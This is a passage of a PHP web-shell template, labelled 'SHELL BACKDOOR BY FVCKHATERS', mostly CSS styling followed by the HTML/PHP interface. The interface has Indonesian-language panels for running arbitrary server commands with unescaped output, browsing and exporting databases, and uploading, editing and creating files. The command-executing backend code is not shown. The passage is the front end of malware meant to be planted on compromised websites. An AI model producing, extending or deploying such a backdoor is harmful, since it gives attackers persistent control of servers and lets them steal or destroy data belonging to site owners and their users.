            font-family: 'JetBrains Mono', monospace;
            font-size: 0.72rem;
            font-weight: 500;
        }

        .terminal-output-section { margin-top: 24px; }

        .terminal-output-heading {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            margin-bottom: 10px;
        }

        .terminal-output-title {
            display: flex;
            align-items: center;
            gap: 9px;
            color: #e8e0cf;
            font-size: 0.79rem;
            font-weight: 700;
            letter-spacing: 0.1em;
            text-transform: uppercase;
        }

        .terminal-output-title i { color: #d7bd83; }

        .terminal-output-meta {
            color: #85847e;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.68rem;
        }

        .terminal-window {
            overflow: hidden;
            border: 1px solid rgba(223, 202, 157, 0.17);
            border-radius: 14px;
            background: #050607;
            box-shadow: 0 18px 40px rgba(0,0,0,0.24), inset 0 1px rgba(255,255,255,0.035);
        }

        .terminal-window-bar {
            display: flex;
            align-items: center;
            gap: 7px;
            min-height: 38px;
            padding: 0 14px;
            border-bottom: 1px solid rgba(255,255,255,0.06);
            background: linear-gradient(180deg, #17191b, #101112);
        }

        .terminal-window-dot { width: 9px; height: 9px; border-radius: 50%; }
        .terminal-window-dot.is-red { background: #c77972; }
        .terminal-window-dot.is-yellow { background: #d7bd83; }
        .terminal-window-dot.is-green { background: #829b7b; }

        .terminal-window-name {
            margin-left: 5px;
            color: #898780;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.67rem;
        }

        .terminal-output {
            min-height: 170px;
            max-height: 52vh;
            margin: 0;
            padding: 22px 24px 24px;
            overflow: auto;
            color: #b8e1af;
            background: radial-gradient(circle at 8% 0%, rgba(127, 156, 131, 0.08), transparent 32%), #050607;
            font-size: 0.82rem;
            line-height: 1.75;
            scrollbar-color: rgba(201,169,110,0.4) transparent;
        }

        .terminal-empty-state {
            display: flex;
            align-items: center;
            gap: 10px;
            min-height: 170px;
            padding: 22px 24px;
            color: #77766f;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.78rem;
        }

        .terminal-empty-state i { color: #9f8a5d; }

        @media (max-width: 600px) {
            .terminal-card-header { align-items: flex-start; flex-direction: column; padding: 20px; }
            .terminal-content { padding: 20px; }
            .terminal-command-form { flex-direction: column; }
            .terminal-execute-btn { width: 100%; }
            .terminal-output { padding: 18px; font-size: 0.76rem; }
        }

        .actions-group {
            display: flex;
            gap: 8px;
        }

        .file-action-form { display: inline-flex; margin: 0; }
        .actions-group .icon-action {
            display: inline-grid;
            place-items: center;
            width: 38px;
            height: 38px;
            min-width: 38px;
            padding: 0;
            border: 1px solid rgba(223, 202, 157, 0.2);
            border-radius: 11px;
            background: linear-gradient(145deg, rgba(201,169,110,0.16), rgba(201,169,110,0.055));
            color: #e3ca91;
            font-size: 0.9rem;
            box-shadow: inset 0 1px rgba(255,255,255,0.05);
        }
        .actions-group .icon-action:hover {
            transform: translateY(-2px);
            border-color: rgba(223,202,157,0.5);
            background: linear-gradient(145deg, rgba(201,169,110,0.32), rgba(201,169,110,0.16));
            color: #f4e3bb;
            box-shadow: 0 7px 18px rgba(156,119,56,0.2), inset 0 1px rgba(255,255,255,0.1);
        }
        .actions-group .icon-action-delete { border-color: rgba(199,121,114,0.22); background: rgba(150,65,60,0.11); color: #d89188; }
        .actions-group .icon-action-delete:hover { border-color: rgba(220,120,110,0.58); background: rgba(150,65,60,0.24); color: #ffd2cb; }
        .actions-group .icon-action-rename { border-color: rgba(127,156,131,0.22); background: rgba(80,115,84,0.12); color: #a9c4a4; }
        .actions-group .icon-action-rename:hover { border-color: rgba(147,179,149,0.55); background: rgba(80,115,84,0.24); color: #e0f0d9; }

        @keyframes cardAppear {
            from { opacity: 0; transform: translateY(12px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Executive midnight and champagne theme */
        :root {
            color-scheme: dark;
            --bg-base: #08090c;
            --bg-surface: #111216;
            --bg-glass: rgba(17, 18, 22, 0.82);
            --border-subtle: rgba(223, 202, 157, 0.13);
            --border-glow: rgba(211, 178, 111, 0.38);
            --primary: #c9a96e;
            --primary-hover: #e0c58c;
            --accent-green: #7f9c83;
            --accent-red: #c77972;
            --text-main: #f2eee5;
            --text-muted: #aaa69c;
            --radius-lg: 20px;
            --radius-md: 12px;
            --transition-smooth: 260ms cubic-bezier(0.2, 0.75, 0.25, 1);
        }

        body {
            position: relative;
            isolation: isolate;
            overflow-x: hidden;
            background-color: var(--bg-base);
            background-image:
                radial-gradient(ellipse at 14% -8%, rgba(191, 151, 81, 0.16), transparent 36%),
                radial-gradient(ellipse at 92% 24%, rgba(76, 91, 77, 0.13), transparent 34%),
                linear-gradient(145deg, #08090c 0%, #0b0c10 52%, #08090c 100%);
        }

        body::before {
            content: "";
            position: fixed;
            inset: 0;
            z-index: -1;
            pointer-events: none;
            opacity: 0.2;
            background-image: linear-gradient(rgba(255,255,255,0.018) 1px, transparent 1px),
                              linear-gradient(90deg, rgba(255,255,255,0.018) 1px, transparent 1px);
            background-size: 56px 56px;
            mask-image: linear-gradient(to bottom, black, transparent 82%);
        }

        .app-header {
            position: relative;
            overflow: hidden;
            border-color: rgba(223, 202, 157, 0.2);
            background: linear-gradient(115deg, rgba(27, 27, 29, 0.94), rgba(14, 16, 19, 0.82));
            box-shadow: 0 24px 70px rgba(0, 0, 0, 0.42), inset 0 1px rgba(255,255,255,0.055);
            animation: luxuryEnter 850ms cubic-bezier(0.2, 0.75, 0.25, 1) both;
        }

        .app-header::before {
            content: "";
            position: absolute;
            top: 0;
            left: 8%;
            width: 34%;
            height: 1px;
            background: linear-gradient(90deg, transparent, #e3c889, transparent);
            animation: goldSweep 5.5s ease-in-out infinite;
        }

        .app-header h2 {
            font-size: clamp(1.05rem, 2vw, 1.4rem);
            letter-spacing: -0.035em;
        }

        .app-header h2 i,
        .card h3 i { color: #d5b879; filter: drop-shadow(0 0 12px rgba(213,184,121,0.25)); }

        .status-badge {
            background: rgba(113, 145, 116, 0.11);
            border-color: rgba(147, 179, 149, 0.26);
            color: #bad0b5;
            letter-spacing: 0.01em;
        }

        .card {
            position: relative;
            border-color: rgba(223, 202, 157, 0.11);
            background: linear-gradient(145deg, rgba(20, 21, 25, 0.91), rgba(13, 14, 18, 0.88));
            box-shadow: 0 18px 55px rgba(0, 0, 0, 0.3), inset 0 1px rgba(255,255,255,0.035);
            animation: luxuryEnter 700ms cubic-bezier(0.2, 0.75, 0.25, 1) both;
        }

        .card::before {
            content: "";
            position: absolute;
            top: 0;
            left: 30px;
            width: 110px;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(222, 193, 132, 0.72), transparent);
            opacity: 0.65;
            pointer-events: none;
        }

        .card:hover {
            transform: translateY(-3px);
            border-color: rgba(223, 202, 157, 0.23);
            box-shadow: 0 25px 65px rgba(0, 0, 0, 0.42), 0 0 30px rgba(190, 158, 96, 0.045);
        }

        .card h3 { letter-spacing: -0.025em; }

        input:not([type]), input[type=text], input[type=password], input[type=file], textarea, select {
            border-color: rgba(223, 202, 157, 0.15);
            background: rgba(7, 8, 11, 0.84);
        }

        input:hover, textarea:hover, select:hover { border-color: rgba(223, 202, 157, 0.32); }

        input:focus, textarea:focus, select:focus {
            border-color: rgba(211, 178, 111, 0.8);
            box-shadow: 0 0 0 4px rgba(201, 169, 110, 0.12), inset 0 2px 4px rgba(0,0,0,0.4);
        }

        button, .btn {
            background: linear-gradient(135deg, #d7bd83, #a98246);
            color: #17140e;
            box-shadow: 0 7px 22px rgba(156, 119, 56, 0.2), inset 0 1px rgba(255,255,255,0.28);
        }

        button::after, .btn::after {
            pointer-events: none;
            opacity: 0;
            transform: translateX(-115%);
            background: linear-gradient(105deg, transparent 25%, rgba(255,255,255,0.38) 48%, transparent 70%);
            transition: transform 650ms ease, opacity 180ms ease;
        }

        button:hover::after, .btn:hover::after { opacity: 1; transform: translateX(115%); }

        button:hover, .btn:hover {
            color: #100e0a;
            box-shadow: 0 10px 28px rgba(156, 119, 56, 0.3);
        }

        .btn-green {
            background: linear-gradient(135deg, #829b7b, #526c56);
            color: #f5f2e9;
            box-shadow: 0 7px 22px rgba(75, 105, 79, 0.2), inset 0 1px rgba(255,255,255,0.16);
        }

        .btn-green:hover { color: #fff; box-shadow: 0 10px 28px rgba(75, 105, 79, 0.32); }

        .btn-red {
            background: linear-gradient(135deg, #b56d65, #824741);
            color: #fff8f4;
            box-shadow: 0 7px 22px rgba(130, 71, 65, 0.2);
        }

        .btn-secondary {
            background: linear-gradient(145deg, rgba(255,255,255,0.055), rgba(255,255,255,0.018));
            border-color: rgba(223, 202, 157, 0.16);
            color: var(--text-main);
            box-shadow: inset 0 1px rgba(255,255,255,0.045);
        }

        .btn-secondary:hover { color: #f6e8c7; border-color: rgba(223, 202, 157, 0.34); }

        .table-list-badge {
            background: linear-gradient(145deg, rgba(255,255,255,0.055), rgba(255,255,255,0.018));
            border-color: rgba(223, 202, 157, 0.14);
            color: #d8c69e;
        }

        .table-list-badge:hover {
            background: linear-gradient(135deg, #b99a60, #8d7043);
            border-color: #d7bd83;
            color: #fffaf0;
            box-shadow: 0 8px 22px rgba(156, 119, 56, 0.22);
        }

        .db-table-actions { display: flex; flex-wrap: wrap; gap: 9px; }
        .db-table-actions .btn { padding: 8px 13px; font-size: 0.78rem; }

        #dbOut {
            border-color: rgba(223, 202, 157, 0.13);
            background: linear-gradient(145deg, rgba(8, 9, 12, 0.96), rgba(13, 14, 17, 0.94));
            box-shadow: inset 0 1px rgba(255,255,255,0.025), 0 12px 32px rgba(0,0,0,0.18);
        }

        table { border-color: rgba(223, 202, 157, 0.13); }
        th { color: #c7b88f; }
        table.db-table th { color: #d6bc7f; }
        tr:hover td { background: rgba(201, 169, 110, 0.045); }

        .permission-badge {
            display: inline-flex;
            align-items: center;
            gap: 7px;
            padding: 5px 10px;
            border: 1px solid transparent;
            border-radius: 999px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.78rem;
            font-weight: 600;
            white-space: nowrap;
        }

        .permission-writable {
            color: #34d399;
            background: rgba(16, 185, 129, 0.12);
            border-color: rgba(16, 185, 129, 0.28);
        }

        .permission-readonly {
            color: #f87171;
            background: rgba(239, 68, 68, 0.12);
            border-color: rgba(239, 68, 68, 0.28);
        }

        .permission-unknown {
            color: #fbbf24;
            background: rgba(245, 158, 11, 0.12);
            border-color: rgba(245, 158, 11, 0.28);
        }

        a { color: #d2b876; }
        a:hover { color: #f0dba9; }

        button:focus-visible, .btn:focus-visible, a:focus-visible, .table-list-badge:focus-visible {
            outline: 2px solid #e4c982;
            outline-offset: 3px;
        }

        .file-manager-actions {
            display: grid;
            grid-template-columns: minmax(0, 1fr) auto;
            align-items: center;
            gap: 16px;
            margin-bottom: 24px;
        }

        .file-tools-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 14px;
            flex-wrap: wrap;
            margin: -6px 0 20px;
            padding: 12px;
            border: 1px solid rgba(223, 202, 157, 0.11);
            border-radius: 14px;
            background: linear-gradient(115deg, rgba(255,255,255,0.028), rgba(255,255,255,0.01));
        }

        .file-search-form {
            display: flex;
            align-items: center;
            flex: 1;
            min-width: min(100%, 420px);
            gap: 8px;
        }

        .file-search-input {
            display: flex;
            align-items: center;
            flex: 1;
            min-width: 180px;
            border: 1px solid rgba(223, 202, 157, 0.15);
            border-radius: 10px;
            background: rgba(7, 8, 11, 0.72);
            transition: var(--transition-smooth);
        }

        .file-search-input:focus-within {
            border-color: rgba(211, 178, 111, 0.7);
            box-shadow: 0 0 0 3px rgba(201, 169, 110, 0.1);
        }

        .file-search-input > i { padding-left: 13px; color: #b99a60; font-size: 0.82rem; }
        .file-search-input input {
            width: 100%;
            padding: 11px 13px;
            color: var(--text-main);
            font-family: inherit;
            font-size: 0.86rem;
            border: 0 !important;
            background: transparent !important;
            box-shadow: none !important;
        }
        .file-search-input input:focus { outline: none; }

        .file-tools-hint {
            color: #96928a;
            font-size: 0.73rem;
            white-space: nowrap;
        }

        .file-tools-hint i { margin-right: 5px; color: #d5b879; }

        .actions-group .icon-action-archive {
            border-color: rgba(213, 184, 121, 0.25);
            background: rgba(201, 169, 110, 0.11);
            color: #d7bd83;
        }

        .actions-group .icon-action-archive:hover {
            border-color: rgba(223, 202, 157, 0.58);
            background: rgba(201, 169, 110, 0.25);
            color: #fff0c9;
        }

        .actions-group .icon-action-extract {
            border-color: rgba(127, 156, 131, 0.25);
            background: rgba(80, 115, 84, 0.12);
            color: #a9c4a4;
        }

        .actions-group .icon-action-extract:hover {
            border-color: rgba(147, 179, 149, 0.58);
            background: rgba(80, 115, 84, 0.25);
            color: #e0f0d9;
        }

        .current-directory {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-bottom: 20px;
            padding: 14px 16px 12px;
            border: 1px solid rgba(223, 202, 157, 0.12);
            border-radius: 14px;
            background: linear-gradient(115deg, rgba(255,255,255,0.035), rgba(255,255,255,0.012));
        }

        .current-directory-label {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #b8b2a5;
            font-size: 0.72rem;
            font-weight: 700;
            letter-spacing: 0.09em;
            text-transform: uppercase;
        }

        .current-directory-label i { color: #d5b879; }

        .directory-breadcrumbs {
            display: flex;
            align-items: center;
            gap: 6px;
            min-width: 0;
            overflow-x: auto;
            padding: 1px 1px 5px;
            scrollbar-width: thin;
            scrollbar-color: rgba(201,169,110,0.35) transparent;
        }

        .breadcrumb-link {
            display: inline-flex;
            flex: 0 0 auto;
            align-items: center;
            min-height: 32px;
            padding: 5px 9px;
            border: 1px solid rgba(223,202,157,0.12);
            border-radius: 8px;
            background: rgba(0,0,0,0.2);
            color: #ded4bd;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.74rem;
            transition: var(--transition-smooth);
        }

        .breadcrumb-link:hover {
            border-color: rgba(213,184,121,0.5);
            background: rgba(201,169,110,0.12);
            color: #f3dfaa;
            transform: translateY(-1px);
        }

        .breadcrumb-separator { flex: 0 0 auto; color: rgba(213,184,121,0.48); font-size: 0.6rem; }

        .upload-form {
            display: flex;
            align-items: stretch;
            gap: 12px;
            min-width: 0;
            padding: 10px;
            border: 1px solid rgba(223, 202, 157, 0.14);
            border-radius: 18px;
            background: linear-gradient(135deg, rgba(255,255,255,0.035), rgba(255,255,255,0.012));
            box-shadow: inset 0 1px rgba(255,255,255,0.035), 0 12px 30px rgba(0,0,0,0.14);
        }

        .upload-dropzone {
            position: relative;
            display: grid;
            flex: 1;
            grid-template-columns: 48px minmax(0, 1fr) auto;
            grid-template-rows: auto auto;
            align-items: center;
            column-gap: 14px;
            row-gap: 3px;
            min-width: 0;
            min-height: 82px;
            margin: 0;
            padding: 12px 15px;
            overflow: hidden;
            border: 1px dashed rgba(213, 184, 121, 0.35);
            border-radius: 13px;
            background: radial-gradient(ellipse at 0% 50%, rgba(201,169,110,0.09), transparent 58%), rgba(5,6,8,0.45);
            color: var(--text-main);
            text-transform: none;
            letter-spacing: normal;
            cursor: pointer;
            transition: var(--transition-smooth);
        }

        .upload-dropzone:hover,
        .upload-dropzone:focus-within,
        .upload-dropzone.is-dragover {
            border-color: #d7bd83;
            background: radial-gradient(ellipse at 0% 50%, rgba(201,169,110,0.16), transparent 62%), rgba(10,10,11,0.8);
            box-shadow: 0 0 0 3px rgba(201,169,110,0.08), inset 0 1px rgba(255,255,255,0.04);
        }

        .upload-dropzone.is-dragover { transform: scale(1.008); }

        .upload-file-input {
            position: absolute;
            width: 1px !important;
            height: 1px !important;
            padding: 0 !important;
            margin: -1px !important;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border: 0 !important;
            opacity: 0;
        }

        .upload-icon {
            grid-column: 1;
            grid-row: 1 / span 2;
            display: grid;
            place-items: center;
            width: 46px;
            height: 46px;
            border: 1px solid rgba(213,184,121,0.25);
            border-radius: 13px;
            background: linear-gradient(145deg, rgba(201,169,110,0.18), rgba(201,169,110,0.055));
            color: #ddc68f;
            font-size: 1.12rem;
            transition: var(--transition-smooth);
        }

        .upload-dropzone:hover .upload-icon { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(201,169,110,0.12); }

        .upload-copy { grid-column: 2; grid-row: 1; min-width: 0; }
        .upload-copy strong { display: block; color: #f0eadc; font-size: 0.88rem; font-weight: 600; }
        .upload-copy small { display: block; margin-top: 2px; color: #98958d; font-size: 0.74rem; font-weight: 400; }

        .upload-file-name {
            grid-column: 2;
            grid-row: 2;
            overflow: hidden;
            color: #c8b47f;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.7rem;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .upload-browse {
            grid-column: 3;
            grid-row: 1 / span 2;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 10px 13px;
            border: 1px solid rgba(223,202,157,0.18);
            border-radius: 10px;
            background: rgba(255,255,255,0.045);
            color: #e4d5b4;
            font-size: 0.78rem;
            font-weight: 600;
            white-space: nowrap;
            transition: var(--transition-smooth);
        }

        .upload-dropzone:hover .upload-browse { border-color: rgba(223,202,157,0.4); background: rgba(201,169,110,0.09); }

        .upload-submit { align-self: stretch; min-width: 148px; padding: 0 18px; border-radius: 13px; }
        .create-file-btn { min-height: 54px; white-space: nowrap; }

        @media (max-width: 900px) {
            .file-manager-actions { grid-template-columns: 1fr; }
            .create-file-btn { justify-self: start; }
            .file-tools-hint { white-space: normal; }
        }

        @media (max-width: 600px) {
            .upload-form { flex-direction: column; }
            .upload-dropzone { grid-template-columns: 42px minmax(0, 1fr); column-gap: 11px; padding: 12px; }
            .upload-icon { width: 40px; height: 40px; }
            .upload-browse { grid-column: 2; grid-row: 3; justify-self: start; margin-top: 6px; padding: 7px 10px; }
            .upload-submit { min-height: 48px; }
            .upload-copy small { font-size: 0.69rem; }
            .file-search-form { min-width: 100%; flex-wrap: wrap; }
            .file-search-input { flex-basis: 100%; }
            .file-search-form .btn { flex: 1; }
        }

        @keyframes luxuryEnter {
            from { opacity: 0; filter: blur(4px); }
            to { opacity: 1; filter: blur(0); }
        }

        @keyframes goldSweep {
            0%, 100% { transform: translateX(-20%); opacity: 0.45; }
            50% { transform: translateX(150%); opacity: 0.95; }
        }

        @media (max-width: 720px) {
            body { padding: 20px 12px; }
            .app-header { align-items: flex-start; gap: 16px; flex-direction: column; padding: 20px; }
            .card { padding: 20px; margin-bottom: 18px; }
            .db-grid { grid-template-columns: repeat(auto-fit, minmax(145px, 1fr)); }
            th, td { padding: 10px 12px; }
        }

        .app-modal-backdrop {
            position: fixed;
            inset: 0;
            z-index: 9999;
            display: grid;
            place-items: center;
            padding: 20px;
            background: rgba(3, 4, 6, 0.76);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            opacity: 0;
            visibility: hidden;
            transition: opacity 220ms ease, visibility 220ms ease;
        }

        .app-modal-backdrop.is-open { opacity: 1; visibility: visible; }

        .app-modal {
            width: min(100%, 440px);
            padding: 28px;
            border: 1px solid rgba(223, 202, 157, 0.28);
            border-radius: 20px;
            background: linear-gradient(145deg, #191a1d, #101114 72%);
            box-shadow: 0 30px 100px rgba(0,0,0,0.65), inset 0 1px rgba(255,255,255,0.06), 0 0 45px rgba(201,169,110,0.08);
            transform: translateY(14px) scale(0.975);
            transition: transform 260ms cubic-bezier(0.2,0.75,0.25,1);
        }

        .app-modal-backdrop.is-open .app-modal { transform: translateY(0) scale(1); }

        .app-modal-heading { display: flex; align-items: center; gap: 14px; margin-bottom: 15px; }
        .app-modal-icon {
            display: grid;
            flex: 0 0 46px;
            place-items: center;
            width: 46px;
            height: 46px;
            border: 1px solid rgba(213,184,121,0.3);
            border-radius: 14px;
            background: rgba(201,169,110,0.12);
            color: #e1c784;
            font-size: 1.1rem;
        }
        .app-modal-icon.is-danger { border-color: rgba(199,121,114,0.35); background: rgba(150,65,60,0.15); color: #e49a91; }
        .app-modal-title { margin: 0; color: #f4eee1; font-size: 1.12rem; font-weight: 700; letter-spacing: -0.02em; }
        .app-modal-message { margin: 0 0 20px; color: #aaa69c; font-size: 0.88rem; line-height: 1.65; }
        .app-modal-input-label { display: block; margin-bottom: 8px; color: #c8b47f; font-size: 0.72rem; font-weight: 700; letter-spacing: 0.06em; text-transform: uppercase; }
        .app-modal-input { margin-bottom: 20px; }
        .app-modal-input[hidden], .app-modal-input-label[hidden] { display: none; }
        .app-modal-footer { display: flex; justify-content: flex-end; gap: 10px; margin-top: 8px; }
        .app-modal-footer .btn { min-height: 42px; padding: 9px 15px; font-size: 0.82rem; }
        .app-modal-confirm.is-danger { background: linear-gradient(135deg, #b56d65, #824741); color: #fff8f4; box-shadow: 0 7px 20px rgba(130,71,65,0.25); }
        .app-modal-confirm.is-danger:hover { color: #fff; }

        @media (prefers-reduced-motion: reduce) {
            *, *::before, *::after {
                animation-duration: 0.01ms !important;
                animation-iteration-count: 1 !important;
                scroll-behavior: auto !important;
                transition-duration: 0.01ms !important;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Header -->
        <div class="app-header">
            <h2><i class="fa-solid fa-layer-group"></i> SHELL BACKDOOR BY FVCKHATERS</h2>
            <div class="status-badge">
                <i class="fa-solid fa-circle-nodes"></i> POWERED BY INDEPENDENT
            </div>
        </div>

        <?php if (!empty($pesanAksi)): ?>
            <div class="alert-box <?php echo isset($pesanType) && $pesanType === 'error' ? 'alert-error' : 'alert-success'; ?>">
                <i class="fa-solid <?php echo isset($pesanType) && $pesanType === 'error' ? 'fa-triangle-exclamation' : 'fa-circle-check'; ?> fa-lg"></i>
                <span><?php echo $pesanAksi; ?></span>
            </div>
        <?php endif; ?>

        <!-- MODAL / FORM EDIT FILE -->
        <?php if ($modeEdit): ?>
        <div class="card" style="border-color: var(--primary);">
            <h3><i class="fa-solid fa-pen-nib"></i> Edit File: <?php echo htmlspecialchars(basename($fileTargetEdit)); ?></h3>
            <p style="margin-bottom: 18px; color: var(--text-muted); font-size: 0.85rem;"><i class="fa-solid fa-folder-open"></i> Path: <?php echo htmlspecialchars($fileTargetEdit); ?></p>
            <form method="post">
                <input type="hidden" name="path_file_edit" value="<?php echo htmlspecialchars($fileTargetEdit); ?>">
                <textarea name="isi_file_edit" rows="18"><?php echo htmlspecialchars($kontenFileEdit); ?></textarea><br>
                <div style="display: flex; gap: 12px; margin-top: 18px;">
                    <button type="submit" name="submit_simpan_edit" class="btn btn-green"><i class="fa-solid fa-floppy-disk"></i> Simpan Perubahan</button>
                    <a href="?dir=<?php echo urlencode(dirname($fileTargetEdit)); ?>" class="btn btn-secondary"><i class="fa-solid fa-arrow-left"></i> Kembali</a>
                </div>
            </form>
        </div>
        <?php endif; ?>

        <!-- FORM BUAT FILE BARU -->
        <?php if ($modeBuatBaru): ?>
        <div class="card" style="border-color: var(--accent-green);">
            <h3><i class="fa-solid fa-file-circle-plus"></i> Buat Berkas Baru</h3>
            <p style="margin-bottom: 18px; color: var(--text-muted); font-size: 0.85rem;"><i class="fa-solid fa-folder"></i> Direktori: <?php echo htmlspecialchars($dir); ?></p>
            <form method="post">
                <div style="margin-bottom: 15px;">
                    <label>Nama Berkas (contoh: <code>index.php</code>)</label>
                    <input type="text" name="nama_file_baru" placeholder="nama_berkas.php" required>
                </div>
                <div style="margin-bottom: 18px;">
                    <label>Konten Berkas</label>
                    <textarea name="isi_file_baru" rows="12" placeholder="Tulis baris kode di sini..."></textarea>
                </div>
                <div style="display: flex; gap: 12px;">
                    <button type="submit" name="submit_buat_file" class="btn btn-green"><i class="fa-solid fa-check"></i> Buat Berkas</button>
                    <a href="?dir=<?php echo urlencode($dir); ?>" class="btn btn-secondary"><i class="fa-solid fa-xmark"></i> Batal</a>
                </div>
            </form>
        </div>
        <?php endif; ?>

        <!-- DATABASE MANAGER GUI -->
        <div class="card" id="databaseManagerCard">
            <h3><i class="fa-solid fa-database"></i> Database Management Studio</h3>
            <div class="db-grid">
                <div>
                    <label>DB_CONNECTION</label>
                    <input id="db_conn" value="mysql">
                </div>
                <div>
                    <label>DB_HOST</label>
                    <input id="db_host" value="127.0.0.1">
                </div>
                <div>
                    <label>DB_PORT</label>
                    <input id="db_port" value="3306">
                </div>
                <div>
                    <label>DB_DATABASE</label>
                    <input id="db_name" placeholder="nama_db">
                </div>
                <div>
                    <label>DB_USERNAME</label>
                    <input id="db_user" value="root">
                </div>
                <div>
                    <label>DB_PASSWORD</label>
                    <input id="db_pass" type="password" placeholder="••••••••">
                </div>
            </div>
            <div style="margin-bottom: 18px; display: flex; gap: 12px; align-items: center; flex-wrap: wrap;">
                <button type="button" onclick="dbAction('test')" class="btn"><i class="fa-solid fa-plug-circle-check"></i> Test Koneksi</button>
                <button type="button" onclick="dbAction('tables')" class="btn btn-green"><i class="fa-solid fa-table-cells"></i> Lihat Daftar Tabel</button>
                <button type="button" onclick="exportDatabaseJson()" class="btn btn-secondary"><i class="fa-solid fa-file-export"></i> Export Semua Data JSON</button>
                <span id="dbStatus" style="font-size: 0.85rem; color: var(--text-muted);"><i class="fa-solid fa-circle-info"></i> Menunggu tindakan...</span>
            </div>

            <div id="dbOut">Hasil keluaran database, tabel, serta data interaktif akan ditampilkan di ruang kerja ini...</div>
        </div>

        <!-- TERMINAL SHELL -->
        <div class="card terminal-card">
            <div class="terminal-card-header">
                <div class="terminal-card-heading">
                    <h3><i class="fa-solid fa-terminal"></i> Interactive Shell Terminal</h3>
                    <span class="terminal-subtitle">Jalankan perintah langsung dari direktori aktif</span>
                </div>
                <span class="terminal-session-status">SESSION ACTIVE</span>
            </div>

            <div class="terminal-content">
                <form method="post" class="terminal-command-form">
                    <div class="terminal-input-shell">
                        <span class="terminal-prompt" aria-hidden="true">$</span>
                        <input class="terminal-command-input" type="text" name="command" placeholder="Masukkan perintah, misalnya ls -la atau pwd" value="<?php echo htmlspecialchars($commandDijalankan); ?>" aria-label="Perintah terminal" required>
                    </div>
                    <button type="submit" name="submit_shell" class="btn terminal-execute-btn"><i class="fa-solid fa-play"></i> Eksekusi</button>
                </form>

                <div class="terminal-shortcuts">
                    <span class="terminal-shortcuts-label">Quick run</span>
                    <button type="button" class="btn btn-secondary terminal-shortcut" onclick="setCmd('ls -la')">ls -la</button>
                    <button type="button" class="btn btn-secondary terminal-shortcut" onclick="setCmd('pwd')">pwd</button>
                    <button type="button" class="btn btn-secondary terminal-shortcut" onclick="setCmd('whoami')">whoami</button>
                    <button type="button" class="btn btn-secondary terminal-shortcut" onclick="setCmd('df -h')">df -h</button>
                    <button type="button" class="btn btn-secondary terminal-shortcut" onclick="setCmd('uname -a')">uname -a</button>
                </div>

                <div class="terminal-output-section">
                    <div class="terminal-output-heading">
                        <span class="terminal-output-title"><i class="fa-solid fa-square-poll-vertical"></i> Output eksekusi</span>
                        <?php if (!empty($outputShell)): ?>
                            <span class="terminal-output-meta"><?php echo max(1, substr_count($outputShell, "\n") + 1); ?> baris</span>
                        <?php else: ?>
                            <span class="terminal-output-meta">menunggu perintah</span>
                        <?php endif; ?>
                    </div>

                    <div class="terminal-window">
                        <div class="terminal-window-bar" aria-hidden="true">
                            <span class="terminal-window-dot is-red"></span>
                            <span class="terminal-window-dot is-yellow"></span>
                            <span class="terminal-window-dot is-green"></span>
                            <span class="terminal-window-name">shell-output</span>
                        </div>
                        <?php if (!empty($outputShell)): ?>
                            <pre id="shellOutput" class="terminal-output"><?php echo $outputShell; ?></pre>
                        <?php else: ?>
                            <div class="terminal-empty-state"><i class="fa-solid fa-arrow-turn-down"></i> Output perintah akan tampil di sini...</div>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>

        <!-- FILE MANAGER & UPLOAD -->
        <div class="card">
            <h3><i class="fa-solid fa-folder-tree"></i> File Manager Studio</h3>
            <div class="current-directory">
                <span class="current-directory-label"><i class="fa-solid fa-location-dot"></i> Path Saat Ini</span>
                <nav class="directory-breadcrumbs" aria-label="Direktori saat ini">
                    <?php foreach ($breadcrumbItems as $index => $breadcrumbItem): ?>
                        <?php if ($index > 0): ?><i class="fa-solid fa-chevron-right breadcrumb-separator" aria-hidden="true"></i><?php endif; ?>
                        <a class="breadcrumb-link" href="?dir=<?php echo urlencode($breadcrumbItem['path']); ?>" title="Buka <?php echo htmlspecialchars($breadcrumbItem['path'], ENT_QUOTES, 'UTF-8'); ?>"><?php echo htmlspecialchars($breadcrumbItem['name'], ENT_QUOTES, 'UTF-8'); ?></a>
                    <?php endforeach; ?>
                </nav>
            </div>
            
            <div class="file-manager-actions">
                <form method="post" enctype="multipart/form-data" class="upload-form" id="uploadForm">
                    <label class="upload-dropzone" for="uploadFile">
                        <input class="upload-file-input" type="file" id="uploadFile" name="berkas" required>
                        <span class="upload-icon"><i class="fa-solid fa-cloud-arrow-up"></i></span>
                        <span class="upload-copy">
                            <strong>Pilih berkas untuk diunggah</strong>
                            <small>Seret dan lepas berkas di sini, atau pilih dari perangkat</small>
                        </span>
                        <span class="upload-file-name" id="uploadFileName">Belum ada berkas dipilih</span>
                        <span class="upload-browse"><i class="fa-regular fa-folder-open"></i> Pilih berkas</span>
                    </label>
                    <button type="submit" name="submit_upload" class="btn upload-submit"><i class="fa-solid fa-arrow-up-from-bracket"></i> Unggah berkas</button>
                </form>
                <a href="?dir=<?php echo urlencode($dir); ?>&newfile=1" class="btn btn-green create-file-btn"><i class="fa-solid fa-plus"></i> Buat Berkas Baru</a>
            </div>

            <div class="file-tools-row">
                <form method="get" class="file-search-form">
                    <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir, ENT_QUOTES, 'UTF-8'); ?>">
                    <div class="file-search-input">
                        <i class="fa-solid fa-magnifying-glass" aria-hidden="true"></i>
                        <input type="search" name="search" value="<?php echo htmlspecialchars($fileSearch, ENT_QUOTES, 'UTF-8'); ?>" placeholder="Cari nama berkas di direktori ini..." aria-label="Cari berkas">
                    </div>
